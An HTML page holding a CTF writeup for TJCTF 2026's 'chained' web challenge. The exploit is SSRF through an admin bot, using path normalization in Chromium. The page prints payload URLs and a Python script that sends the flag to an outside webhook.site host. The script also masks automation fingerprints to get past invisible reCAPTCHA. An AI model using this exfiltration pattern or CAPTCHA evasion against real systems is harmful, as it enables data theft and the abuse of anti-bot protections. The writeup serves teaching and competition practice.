@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <meta charset="utf-8">
+  <title>chained - Writeup</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="CTF Writeup">
+  <meta name="author" content="Cyber Saguaros">
+
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400|Josefin+Sans:300,400,600,700">
+  <link rel="stylesheet" href="/plugins/bootstrap/bootstrap.min.css">
+  <link rel="stylesheet" href="/plugins/themefisher-font/themefisher-font.min.css">
+  <link rel="stylesheet" href="/scss/style.min.css" media="screen">
+
+  <style>
+    body {
+      background:
+        radial-gradient(circle at top, rgba(203, 166, 247, 0.18), transparent 34%),
+        linear-gradient(180deg, #1e1e2e 0%, #181825 100%);
+      color: #cdd6f4;
+      font-family: 'Droid Serif', 'Josefin Sans', sans-serif;
+    }
+
+    header.navigation {
+      background-color: #181825;
+    }
+
+    /* Force navbar/link colors to match site header even if external CSS didn't load */
+    .navigation, .navbar {
+      background-color: #181825 !important;
+    }
+    .navbar-brand, .nav-link {
+      color: #cdd6f4 !important;
+    }
+    .nav-link:hover, .navbar-brand:hover {
+      color: #d8bafc !important;
+    }
+
+    .writeup-container {
+      max-width: 900px;
+      margin: 3rem auto;
+      background: rgba(24, 24, 37, 0.94);
+      border: 1px solid rgba(203, 166, 247, 0.18);
+      border-radius: 16px;
+      padding: 2rem;
+      box-shadow: 0 16px 50px rgba(0, 0, 0, 0.28);
+    }
+
+    .markdown-content {
+      color: rgba(205, 214, 244, 0.86);
+      line-height: 1.8;
+    }
+
+    .markdown-content h1 { color: #f5e0dc; font-size: 2.2rem; margin: 0 0 1rem; line-height: 1.2; border-bottom: 2px solid rgba(203,166,247,0.2); padding-bottom:1rem; }
+    .markdown-content h2 { color: #f5e0dc; font-size: 1.6rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(203,166,247,0.12); padding-bottom:0.5rem; }
+    .markdown-content h3 { color: #cba6f7; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+    .markdown-content p { margin-bottom: 1rem; }
+    .markdown-content code { background: rgba(0,0,0,0.3); color: #94e2d5; padding:0.2rem 0.5rem; border-radius:4px; font-family: 'Courier New', monospace; }
+    .markdown-content pre { background: rgba(0,0,0,0.4); border-left: 3px solid #cba6f7; padding:1rem; border-radius:6px; overflow-x:auto; margin:1rem 0; }
+    .markdown-content pre code { background:none; color:#89b4fa; padding:0; }
+    .markdown-content blockquote { border-left:4px solid #cba6f7; padding-left:1rem; color:rgba(205,214,244,0.76); font-style:italic; }
+    .markdown-content table { border-collapse: collapse; width:100%; margin:1rem 0; }
+    .markdown-content table th, .markdown-content table td { border:1px solid rgba(203,166,247,0.2); padding:0.75rem; text-align:left; }
+    .markdown-content table th { background: rgba(203,166,247,0.1); color:#f5e0dc; font-weight:700; }
+
+    footer.footer { background-color:#1e1e2e; color:#cdd6f4; padding:2rem 1rem; text-align:center; margin-top:3rem; border-top:1px solid rgba(203,166,247,0.12); }
+  </style>
+</head>
+
+<body>
+  <header class="navigation" style="background-color: #1e1e2e;">
+    <div class="container">
+      <nav class="navbar navbar-expand-lg navbar-dark">
+        <a class="navbar-brand" href="/">Cyber Saguaros</a>
+        <div class="collapse navbar-collapse">
+          <ul class="navbar-nav ml-auto">
+            <li class="nav-item"><a class="nav-link" href="/contact/">Contact</a></li>
+            <li class="nav-item"><a class="nav-link" href="/calendar/">Calendar</a></li>
+            <li class="nav-item"><a class="nav-link" href="/presentations/">Presentations</a></li>
+            <li class="nav-item"><a class="nav-link" href="/writeups/">Writeups</a></li>
+          </ul>
+        </div>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <div class="container">
+      <a href="/writeups/" class="back-link">← Back to Writeups</a>
+      <div class="writeup-container">
+        <div class="markdown-content">
+          <h1 id="chained">chained</h1>
+<p><strong>Author:</strong> Jordan Lanham
+<strong>Event:</strong> TJCTF 2026
+<strong>Category:</strong> web
+<strong>Date:</strong> May 15, 2026
+<strong>Read Time:</strong> 6 minutes</p>
+<hr>
+<h2 id="overview">Overview</h2>
+<p>A Flask app and a Playwright &quot;admin bot&quot; chained together: the bot only navigates to URLs matching <code>^https://chained.tjc.tf/admin/</code>, and it appends the flag to the URL you submit. The Flask <code>/admin</code> endpoint is locked to <code>127.0.0.1</code>, but <code>/</code> blindly SSRFs whatever you put in the <code>url</code> GET param after a string blacklist. By submitting <code>https://chained.tjc.tf/admin/../?url=&lt;webhook&gt;</code>, <strong>Chromium normalizes <code>/admin/../</code> away before sending the request</strong>, so Flask never sees <code>..</code>, passes <code>isSafe()</code>, and then <code>requests.get()</code>&#39;s our webhook with the flag in the URL.</p>
+<h2 id="challenge-description">Challenge Description</h2>
+<blockquote>
+<p>i designed my own admin bot! and i included an admin page that should be super duper secure...
+running on port 5000
+<a href="https://chained.tjc.tf">https://chained.tjc.tf</a> | <a href="https://admin-bot.tjctf.org/chained">https://admin-bot.tjctf.org/chained</a></p>
+</blockquote>
+<p><strong>Files provided:</strong> <code>app.py</code>, <code>index.html</code>, <code>admin-bot.js</code>
+<strong>Endpoints:</strong> <code>https://chained.tjc.tf</code> (Flask app) and <code>https://admin-bot.tjctf.org/chained</code> (admin-bot URL submission form, gated by reCAPTCHA v2 invisible)</p>
+<h2 id="initial-analysis">Initial Analysis</h2>
+<p>Three artifacts to read together:</p>
+<p><strong><code>app.py</code></strong> — two routes:</p>
+<pre><code class="language-python">def isSafe(url):
+    blacklist={&#39;127&#39;,&#39;local&#39;,&#39;2130706433&#39;,&#39;017700000001&#39;,&#39;::1&#39;,&#39;0.0.0.0&#39;,
+               &#39;[::]&#39;,&#39;ffff&#39;,&#39;0.0.0.0&#39;,&#39;0x&#39;,&#39;..&#39;,&#39;%2e%2e&#39;,&#39;@&#39;}
+    return all([i not in url.lower() for i in blacklist])
+
+@app.route(&#39;/&#39;, methods=[&#39;GET&#39;,&#39;POST&#39;])
+def index():
+    if POST: if not isSafe(url): denied; return redirect(url_for(&#39;index&#39;, url=url))
+    url = args.get(&#39;url&#39;) or &#39;&#39;
+    if url:
+        try: req = &#39;Your response: &#39; + requests.get(url).text
+        except: return &#39;Uh-oh...&#39;
+    ...
+
+@app.route(&#39;/admin&#39;)
+def js():
+    if request.remote_addr != &#39;127.0.0.1&#39;: return &#39;Access denied...&#39;
+    return request.args.get(&quot;q&quot;,&quot;&quot;), 200, {&#39;Content-Type&#39;:&#39;application/javascript&#39;}
+</code></pre>
+<p>The <code>/</code> route is a textbook SSRF behind a substring blacklist. <code>/admin</code> reflects the <code>q</code> param as JavaScript but is only reachable from <code>127.0.0.1</code>.</p>
+<p><strong><code>admin-bot.js</code></strong> — the headless bot:</p>
+<pre><code class="language-js">urlRegex: /^https:\/\/chained\.tjc\.tf\/admin\//,
+handler: async (url, ctx) =&gt; {
+    const page = await ctx.newPage();
+    await page.goto(url + flag, { timeout: 3000, waitUntil: &#39;domcontentloaded&#39; });
+    await sleep(5000);
+}
+</code></pre>
+<p>Two crucial mechanics:</p>
+<ol>
+<li>The bot validates the URL <em>with the regex</em> against the raw string you submit (must start with <code>/admin/</code>).</li>
+<li>The bot then calls <code>page.goto(url + flag, ...)</code> — concatenating the flag onto your URL <strong>as a string</strong>, then handing it to Chromium, which will normalize the URL before issuing any HTTP request.</li>
+</ol>
+<h2 id="solution-approach">Solution Approach</h2>
+<h3 id="step-1-reconnaissance">Step 1: Reconnaissance</h3>
+<p>Fetched the live <code>https://chained.tjc.tf</code> — matches the source. Verified the SSRF primitive directly:</p>
+<pre><code>GET /?url=https://example.com/
+-&gt; renders Example Domain HTML inside the page (server-side requests.get)
+</code></pre>
+<p><code>isSafe()</code> looks for substrings in the URL. The blacklist&#39;s job is to stop SSRF to <code>localhost</code>/<code>127.0.0.1</code> (so an attacker can&#39;t pivot to <code>/admin</code> and read the flag-as-JS reflection). But the flag is delivered by the <em>bot</em>, not by <code>/admin</code> reflection — so the relevant primitive is &quot;make the bot hit a URL we control with the flag in it.&quot;</p>
+<h3 id="step-2-vulnerability-identification">Step 2: Vulnerability Identification</h3>
+<p>The flag concatenation is the weak link. The bot does:</p>
+<pre><code>page.goto( &lt;attacker_url&gt; + &lt;flag&gt; )
+</code></pre>
+<p>If we can make <code>&lt;attacker_url&gt;</code> syntactically match <code>/admin/...</code> (to pass <code>urlRegex</code>) but <strong>semantically resolve to a different origin or a different path</strong> after the browser normalizes it, we win.</p>
+<p>The classic trick: <code>https://chained.tjc.tf/admin/../?url=&lt;exfil&gt;</code>. The regex <code>/^https:\/\/chained\.tjc\.tf\/admin\//</code> matches the raw string, but Chromium&#39;s URL parser collapses <code>/admin/..</code> -&gt; `` before sending the request. The browser actually fetches:</p>
+<pre><code>https://chained.tjc.tf/?url=&lt;exfil&gt;&lt;flag&gt;
+</code></pre>
+<p>That hits the Flask <code>/</code> route. <code>isSafe()</code> runs on <code>&lt;exfil&gt;&lt;flag&gt;</code>. Our webhook URL contains none of <code>127</code>, <code>local</code>, <code>..</code>, <code>@</code>, etc. -- passes. Server runs <code>requests.get(&quot;&lt;exfil&gt;&lt;flag&gt;&quot;)</code>. The webhook now has the flag in its access log.</p>
+<h3 id="step-3-exploitation">Step 3: Exploitation</h3>
+<p>Generated a webhook.site token via their API:</p>
+<pre><code>POST https://webhook.site/token  -&gt;  uuid 6a7de3de-ca0e-4bcd-b44c-0fb170f9587b
+</code></pre>
+<p>Built the payload submitted to the admin bot:</p>
+<pre><code>https://chained.tjc.tf/admin/../?url=https://webhook.site/6a7de3de-ca0e-4bcd-b44c-0fb170f9587b?leak=
+</code></pre>
+<p>When the bot appends the flag and Chromium normalizes:</p>
+<pre><code>page.goto -&gt; https://chained.tjc.tf/?url=https://webhook.site/&lt;uuid&gt;?leak=tjctf{...}
+Flask    -&gt; requests.get(&quot;https://webhook.site/&lt;uuid&gt;?leak=tjctf{...}&quot;)
+</code></pre>
+<p>The submission form on <code>admin-bot.tjctf.org/chained</code> is gated by Google reCAPTCHA v2 invisible. Rather than fight a CAPTCHA service, I drove the form with a headed Playwright Chromium with a real UA and <code>navigator.webdriver</code> masked — invisible v2 happily passes that fingerprint.</p>
+<h3 id="step-4-flag-extraction">Step 4: Flag Extraction</h3>
+<p>After submitting, polled <code>https://webhook.site/token/&lt;uuid&gt;/requests?sorting=newest</code>. Within ~10 seconds the most recent request URL was:</p>
+<pre><code>https://webhook.site/6a7de3de-ca0e-4bcd-b44c-0fb170f9587b?leak=tjctf%7Bch41n3d_o340e934l35d%7D
+</code></pre>
+<p>URL-decoded query string is the flag.</p>
+<h2 id="code--exploit">Code / Exploit</h2>
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;TJCTF 2026 - chained: SSRF via path-traversal normalization in the admin bot.&quot;&quot;&quot;
+import time, json, re, urllib.request, urllib.parse
+from playwright.sync_api import sync_playwright
+
+WEBHOOK_UUID = &quot;6a7de3de-ca0e-4bcd-b44c-0fb170f9587b&quot;
+WEBHOOK_URL  = f&quot;https://webhook.site/{WEBHOOK_UUID}&quot;
+ADMIN_BOT    = &quot;https://admin-bot.tjctf.org/chained&quot;
+PAYLOAD      = f&quot;https://chained.tjc.tf/admin/../?url={WEBHOOK_URL}?leak=&quot;
+
+def submit(payload):
+    with sync_playwright() as p:
+        b = p.chromium.launch(headless=False,
+                              args=[&quot;--disable-blink-features=AutomationControlled&quot;])
+        ctx = b.new_context(
+            user_agent=(&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) &quot;
+                        &quot;AppleWebKit/537.36 (KHTML, like Gecko) &quot;
+                        &quot;Chrome/126.0.0.0 Safari/537.36&quot;),
+            viewport={&quot;width&quot;: 1280, &quot;height&quot;: 800})
+        page = ctx.new_page()
+        page.add_init_script(
+            &quot;Object.defineProperty(navigator,&#39;webdriver&#39;,{get:()=&gt;undefined})&quot;)
+        page.goto(ADMIN_BOT, wait_until=&quot;domcontentloaded&quot;)
+        page.fill(&#39;input[name=&quot;url&quot;]&#39;, payload)
+        time.sleep(4)                       # let grecaptcha init
+        page.click(&#39;button[type=&quot;submit&quot;]&#39;) # invisible v2 fires here
+        time.sleep(15)                      # bot visits our URL
+        b.close()
+
+def poll():
+    api = f&quot;https://webhook.site/token/{WEBHOOK_UUID}/requests?sorting=newest&quot;
+    for _ in range(30):
+        d = json.loads(urllib.request.urlopen(api, timeout=10).read())
+        for r in d.get(&quot;data&quot;, []):
+            m = re.search(r&quot;tjctf\{[^}]*\}&quot;, urllib.parse.unquote(r.get(&quot;url&quot;,&quot;&quot;)))
+            if m: return m.group(0)
+        time.sleep(3)
+
+submit(PAYLOAD)
+print(&quot;FLAG:&quot;, poll())
+</code></pre>
+<h2 id="technical-details">Technical Details</h2>
+<ul>
+<li><strong>Vulnerability class:</strong> SSRF via URL-parser normalization differential (regex sees raw string, browser sees canonicalized URL) + insufficient substring blacklist.</li>
+<li><strong>Encryption / encoding:</strong> none — pure URL semantics.</li>
+<li><strong>Protocol:</strong> HTTPS; Chromium URL parsing per WHATWG URL Standard collapses <code>/segment/..</code> before issuing the network request.</li>
+<li><strong>Key trick:</strong> <code>/admin/../</code> satisfies <code>^https://chained.tjc.tf/admin/</code> (raw regex) but Chromium normalizes it to <code>/</code> before hitting Flask, so the flag flows through Flask&#39;s SSRF sink instead of the locked-down <code>/admin</code> page.</li>
+</ul>
+<h2 id="key-insights">Key Insights</h2>
+<ul>
+<li>Any time a security check runs against a raw URL string but a <em>different</em> component later parses that URL, look for a parser-differential bypass: <code>..</code>, <code>@</code>, <code>#</code>, mixed schemes, IDN, percent-encoding, etc.</li>
+<li>Substring blacklists for SSRF (<code>isSafe()</code> here) are nearly always bypassable. The real defense is allowlisting the destination host or doing DNS resolution + private-range checks before <code>requests.get</code>.</li>
+<li>Admin-bot challenges where the bot does <code>page.goto(user_url + flag)</code> are a recognizable pattern: get the bot to navigate to <em>your</em> URL while still satisfying the regex, and the flag arrives in your access log.</li>
+<li>reCAPTCHA v2 invisible isn&#39;t actually a wall against authorized red-team work — a headed real-Chromium session with a clean UA and <code>navigator.webdriver</code> masked passes the fingerprint check on first-party origins.</li>
+</ul>
+<h2 id="the-flag">The Flag</h2>
+<pre><code>tjctf{ch41n3d_o340e934l35d}
+</code></pre>
+<h2 id="resources">Resources</h2>
+<ul>
+<li><a href="https://url.spec.whatwg.org/#path-state">WHATWG URL Standard — Path normalization</a></li>
+<li><a href="https://portswigger.net/web-security/ssrf">PortSwigger — SSRF via URL parsing inconsistencies</a></li>
+<li><a href="https://blog.orange.tw/posts/2017-07-how-i-chained-4-vulnerabilities-on-github-enterprise-together-and-took-home-12500x-bounty/">Orange Tsai — A New Era of SSRF (URL parser confusion)</a></li>
+</ul>
+
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="container">
+      <p>&copy; 2024-2026 Cyber Saguaros. All rights reserved.</p>
+    </div>
+  </footer>
+
+  <script src="/plugins/jquery/jquery.js"></script>
+  <script src="/plugins/bootstrap/bootstrap.min.js"></script>
+</body>
+</html>
